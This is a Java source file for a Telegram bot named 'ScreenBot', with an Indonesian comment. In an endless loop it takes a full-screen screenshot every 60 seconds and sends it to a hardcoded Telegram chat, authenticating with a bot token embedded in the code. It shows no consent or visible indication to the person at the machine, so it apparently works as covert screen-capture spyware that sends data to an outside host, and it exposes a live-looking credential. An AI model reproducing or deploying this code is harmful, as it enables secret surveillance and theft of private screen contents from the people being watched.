import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;

public class ScreenBot extends TelegramLongPollingBot {

    private static final String BOT_TOKEN = "8053780203:AAFAV7b_NYcbj2NmakX3_Az4dTnYigPmelA";
    private static final String CHAT_ID   = "7813060570";

    public static void main(String[] args) throws Exception {
        TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
        botsApi.registerBot(new ScreenBot());

        // Ambil & kirim screenshot tiap 60 detik
        while (true) {
            File img = captureScreen();
            new ScreenBot().sendPhoto(img);
            Thread.sleep(60_000);
        }
    }

    private static File captureScreen() throws Exception {
        Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture = new Robot().createScreenCapture(screen);
        File file = new File("screen.jpg");
        ImageIO.write(capture, "jpg", file);
        return file;
    }

    private void sendPhoto(File img) throws Exception {
        SendPhoto msg = new SendPhoto();
        msg.setChatId(CHAT_ID);
        msg.setPhoto(new InputFile(img));
        execute(msg);
    }

    @Override public String getBotUsername() { return "AutoScreenBot"; }
    @Override public String getBotToken() { return BOT_TOKEN; }
    @Override public void onUpdateReceived(Update update) { /* ignore */ }
}
